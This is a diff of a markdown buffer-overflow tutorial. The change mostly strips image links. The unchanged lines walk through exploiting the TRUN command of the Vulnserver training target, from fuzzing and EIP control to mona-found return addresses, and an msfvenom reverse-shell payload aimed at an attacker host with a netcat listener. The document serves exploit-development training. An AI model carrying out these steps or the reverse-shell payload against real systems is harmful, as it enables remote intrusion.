@@ -20,12 +20,6 @@ For the full tutorial and lectures on BOF it is highly recommended to take the 
 - In the Stack we are overflowing the buffer space to reach the **EIP**
 - We can use the **EIP** to point into directions that we instruct
 
-![https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/1-anatomy_of_the_memory.png](https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/1-anatomy_of_the_memory.png)
-
-![https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/2-anatomy_of_the_stack.png](https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/2-anatomy_of_the_stack.png)
-
-![https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/3-overflow.png](https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/3-overflow.png)
-
 ## Steps Involved
 
 1. Spiking
@@ -60,8 +54,6 @@ $_string_variable("0");
 - **in these notes we'll assume that we found the TRUN command and it's vulnerable**
 - when TRUN spike crashes the servers make sure you check out how the server received the command and use it like that in your python script that will come into play later on. In this example it was: `TRUN /.:/`
 - **EBP shows 41414141 which is hex for A**
-
-![https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/4-trun-crashes.png](https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/4-trun-crashes.png)
 
 ## Fuzzing
 
@@ -115,8 +107,6 @@ while True:
 
 The following output will be sent to Vulnserver:
 
-![https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/5-pattern_create.png](https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/5-pattern_create.png)
-
 - copy the output and modify the script where `string = prefix + "A" * 100` to `string = prefix + "<metasploit output>"`
 - this time when the server crashes we'll see the value on the **EIP** and we'll use Metasploit again with that specific patter offset value
 - for the sake of example let's say the EIP value is: `368F4337`
@@ -131,8 +121,6 @@ The following output will be sent to Vulnserver:
 - `offset = 2003`
 - `overflow = "A" * offset + "B" * 4` after running the script we should see that the value for the EIP as 424242 which is "B" in hex code
 
-![https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/6-controlling-the-EIP.png](https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/6-controlling-the-EIP.png)
-
 ## Finding Bad Chars
 
 **Bad Char Generator** (Just copy the bad chars and paste it into the script)
@@ -141,21 +129,13 @@ The following output will be sent to Vulnserver:
 - by default `\x00` the null byte acts up so remove from `retn`
 - check **ESP hexdump**
 - **Make note of the bad chars!**
-
-![https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/7-check-ESP-hexdump.png](https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/7-check-ESP-hexdump.png)
-
 - identify bad characters, everything that's out of order is a bad char
 - **every time you have consecutive bad chars** we only care for the first one, **however** I would take out both since the exploit will still work (at least on this basic level)
-
-![https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/8-ID-bad-characters.png](https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/8-ID-bad-characters.png)
-
 - we are looking for a ***.dll*** or something similar inside of the program that has no memory protections, meaning no DEP no ASLR no SEH
 - **[mona modules](https://github.com/corelan/mona)** helps us to achieve this
 - copy ***mona modules*** into `This PC: Program Files: Program (x86): Immunity INC: Immunity Debugger: PyCommands`
 - in Immunity Debugger in the command bar on the bottom: `!mona modules`
 - in the popup window we want to check for all false in protection settings in something that is attached to Vulnserver
-
-![https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/10-checking-modules.png](https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/10-checking-modules.png)
 
 ### Generating the Jump Code
 
@@ -165,9 +145,6 @@ The following output will be sent to Vulnserver:
 - `JMP ESP` and you'll see this output: `FFE4`
 - back to mona: `!mona find -s "\xffe4" -m essfunc.dll`
 - we're looking for the return addresses
-
-![https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/11-return-addresses.png](https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/11-return-addresses.png)
-
 - our found return address is **625011af**
 - modify in exploit.py: `overflow = "A" * offset
 - modify in exploit.py: `retn = "\xaf\x11\x50\x62"`
@@ -176,31 +153,19 @@ The following output will be sent to Vulnserver:
 - this will throw the same error as before but it will also throw a jump point and we can use Immunity Debugger to catch this
 
 ### Catching The Jump Code
-
-![https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/12-catching-the-jump-code.png](https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/12-catching-the-jump-code.png)
-
 - we should see the following output, meaning that we actually jumped to the ESP
-
-![https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/13-finding-ESP.png](https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/13-finding-ESP.png)
-
 - select it and hit **F2** (it will turn it blue)
 - with that we just set a break point so it will not execute any further, it will break and wait for further instructions from us and that's what we want
 - we're not gonna jump to anywhere and that doesn't matter, all we need to know is that our break point works
 - to test it hit play in Immunity Debugger and run the exploit.py script. The program will stop and break at our break point
 - we control the EIP now, we need to generate some shell code and point directly to it and we're in the home run!
 
-![https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/14-control-the-EIP.png](https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/14-control-the-EIP.png)
-
 ## Gaining Shell Code And Gaining Root
-
 - we're gonna use ***msfvenom*** to generate our shell code
 - `msfvenom -p windows/shell_reverse_tcp LHOST=<kali IP> LPORT=<kali port> EXITFUNC=thread -f c -a x86 -b "\x00"`
 - `p` for payload, `f` for file type (export it in C), `a` for architecture `b` and for bad bytes (from your notes you made earlier)
 - copy generated shell code into our exploit.py script (we don't need the `:` at the end)
 - always note the ***payload size***, it's not gonna matter now but could matter later in a more advanced exploit development
-
-![https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/15-generated-shell-code.png](https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/15-generated-shell-code.png)
-
 - paste it into `payload = ()
 - now we need to add some nobs (padding), update exploit.py: `padding = "\x90" * 32`
 - if we didn't have padding it is possible that our shell code wouldn't work, we might not get code execution on the computer because something interfered here so we added padding to keep it safe (you might have to play around with the `32` value
@@ -209,10 +174,7 @@ The following output will be sent to Vulnserver:
 - run exploit.py and see your shell coming through on your nc listener
 
 # Additional Notes on Python3 and Mona
-
 - you may need to do byte encoding
-
-![https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/16-byte-encoding.png](https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/16-byte-encoding.png)
 
 ## Updated Fuzz script
 
@@ -300,8 +262,6 @@ except:
 - you can copy it and paste it into your script, don't need to go out and look for bad chars on websites
 - mona also creates a .bin file which is handy when we compare this array to find bad chars
 
-![https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/17-mona-bad-chars-byte-array.png](https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/17-mona-bad-chars-byte-array.png)
-
 ## Update Bad Chars
 
 - `badchars = <output from mona>`
@@ -345,19 +305,12 @@ except:
 
 - now you don't have to review the bad chars manually, instead:
 - `!mona compare -f c:\mona\bytearray.bin -a 010AF9C8` where ***010AF9C8*** is the ***ESP*** address
-
-![https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/18-mona-compare-byte-arrays.png](https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/18-mona-compare-byte-arrays.png)
-
 - you'll see the results in a pop up window
-
-![https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/19-mona-results.png](https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/19-mona-results.png)
 
 ## Updated The Jump Address With Mona
 
 - `!mona modules` when we identified the modules that had their values set to False, instead we could just find the jump address with mona
 - `!mona jmp -r ESP -m "essfunc.dll"`
-
-![https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/20-mona-found-jump-address.png](https://github.com/encryptedninja/command-center/raw/master/buffer_overflow/images/20-mona-found-jump-address.png)
 
 ## SOMETIMES the Payload Encoder in python3 does not work as we wanted to
 
